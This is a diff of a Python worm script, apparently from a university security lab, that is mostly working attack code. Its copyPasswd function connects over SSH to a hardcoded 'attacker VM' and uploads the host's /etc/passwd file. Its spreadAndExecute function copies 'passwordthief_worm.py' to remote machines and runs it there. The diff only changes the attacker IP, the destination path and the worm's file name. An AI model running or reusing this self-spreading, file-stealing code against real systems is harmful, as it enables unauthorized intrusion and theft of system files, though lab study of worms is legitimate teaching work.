@@ -18,18 +18,19 @@ credList = [
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
 def copyPasswd():
+	
 	sshClient = paramiko.SSHClient()
 	sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	
 	print("Connecting to attacker VM.")
 	
 	# Hardcoded attacker VM IP-Address. (Change to match your attacker VM IP-Address)
-	sshClient.connect("192.168.1.5", username="cpsc", password="cpsc")
+	sshClient.connect("192.168.1.9", username="cpsc", password="cpsc")
 	
 	print("Sending passwd file to attacker VM.")
 	
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put("/etc/passwd", "/etc/passwd_" + getMyIP())
+	sftpClient.put("/etc/passwd", "/tmp/passwd_" + getMyIP())
 
 ##################################################################
 # Returns whether the worm should spread
@@ -68,9 +69,9 @@ def markInfected():
 def spreadAndExecute(sshClient):
 	
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put("worm.py", "/tmp/worm.py")
-	sshClient.exec_command("chmod a+x /tmp/worm.py")
-	sshClient.exec_command("python /tmp/worm.py 2> errors.txt")
+	sftpClient.put("passwordthief_worm.py", "/tmp/passwordthief_worm.py")
+	sshClient.exec_command("chmod a+x /tmp/passwordthief_worm.py")
+	sshClient.exec_command("python /tmp/passwordthief_worm.py 2> errors.txt")
 	# This function takes as a parameter 
 	# an instance of the SSH class which
 	# was properly initialized and connected
